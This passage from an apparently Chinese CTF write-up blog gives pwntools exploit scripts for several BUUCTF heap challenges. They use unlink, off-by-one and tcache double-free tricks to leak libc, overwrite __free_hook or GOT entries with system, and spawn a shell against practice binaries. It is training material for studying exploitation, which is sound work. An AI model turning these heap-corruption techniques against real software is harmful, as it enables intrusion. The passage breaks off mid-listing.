<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./iz_heap_lv2&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25867</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b  </span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg 0x602040</span></span><br><span class="line"><span class="string">    x/10xg 0x6020E0 </span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># <span class="number">0</span>~<span class="number">256</span> off by null</span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter size: &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Enter data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="meta"># off by null</span></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter index: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Enter data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 清空了</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Enter index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">18</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0xF8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>, <span class="number">1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">ptr = <span class="number">0x602040</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x17</span>)</span><br><span class="line">edit(<span class="number">0</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(ptr + <span class="number">8</span>) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(b<span class="string">&quot;Data: &quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="suctf2018-heap"><a href="#suctf2018-heap" class="headerlink" title="suctf2018_heap"></a>suctf2018_heap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#suctf2018_heap">BUUCTF在线评测</a></p>
<p>题目出题比较奇怪，多了一个类似于缓存的</p>
<p>这个题目主要就是off by one比较奇特，如果我们把堆填满了，就不能用strlen来判断大小，不然会算上下一个块的大小，导致可以任意修改下一个块的大小，其他的都差不太多，这里不能改malloc_hook,只能改got</p>
<p>所以千万不能用strlen(chunk)内容来判断长度</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844268112-ce7f2aa8-e92f-4797-8bd8-321ce9bd1153.png#averageHue=%23eae8e4&clientId=u9d5fd636-f51f-4&from=paste&height=106&id=ub4f20f9f&originHeight=133&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21921&status=done&style=none&taskId=udb3c2b96-fef7-43a6-a081-60cf8806ea2&title=&width=631.2" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./offbyone&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">29014</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b  </span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg 0x06020C0</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># <span class="number">0x80</span>~<span class="number">0x100</span></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;4:edit\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;input len\n&quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;input your data\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;4:edit\n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;input id\n&quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;input your data\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 清空了</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;4:edit\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;input id\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;4:edit\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;input id\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x98</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0x98</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0x98</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0x88</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x88</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">10</span>, <span class="number">4</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line">ptr = <span class="number">0x6020D8</span></span><br><span class="line">edit(</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    p64(<span class="number">0</span>)</span><br><span class="line">    + p64(<span class="number">0x80</span>)</span><br><span class="line">    + p64(ptr - <span class="number">0x18</span>)</span><br><span class="line">    + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    + p64(<span class="number">0x80</span>)</span><br><span class="line">    + b<span class="string">&quot;\x90&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x88</span>, b<span class="string">&quot;A&quot;</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">edit(<span class="number">3</span>, p64(elf.got[<span class="string">&quot;atoi&quot;</span>]))</span><br><span class="line">ru(b<span class="string">&quot;4:edit\n&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;4:edit\n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;input id\n&quot;</span>, str(<span class="number">0</span>).encode())</span><br><span class="line">sa(b<span class="string">&quot;input your data\n&quot;</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">s(b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="qctf-2018-noleak"><a href="#qctf-2018-noleak" class="headerlink" title="qctf_2018_noleak"></a>qctf_2018_noleak</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#qctf_2018_noleak">BUUCTF在线评测</a></p>
<p>很巧妙的题目，main_arena和__malloc_hook地址只有最后p8不一样，可以直接修改不需要爆破</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./QCTF_2018_NoLeak&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">29110</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *0x4008A6</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg 0x601040</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Size: &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 任意溢出</span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Size: &quot;</span>, str(len(content)).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"># 没有清空</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="meta"># def show(index: int):</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x601040</span></span><br><span class="line">add(<span class="number">0x28</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x418</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x420</span>),</span><br><span class="line">)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, p8(<span class="number">0x90</span>))</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(ptr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p8(<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">7</span>, p64(ptr))</span><br><span class="line">edit(<span class="number">0</span>, <span class="keyword">asm</span>(shellcraft.sh()))</span><br><span class="line">sa(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;Size: &quot;</span>, str(<span class="number">0x18</span>).encode())</span><br><span class="line">it()</span><br><span class="line">debug()</span><br><span class="line">it()</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon_2018_children_tcache"></a>hitcon_2018_children_tcache</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#hitcon_2018_children_tcache">BUUCTF在线评测</a></p>
<p>这个题比较巧妙的几个地方</p>
<p>off by one 用来修改size</p>
<p>free之前会memset,所以需要通过不断调整大小来修改prev_size</p>
<p>double free tcache</p>
<p>tcache不检查大小是否匹配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 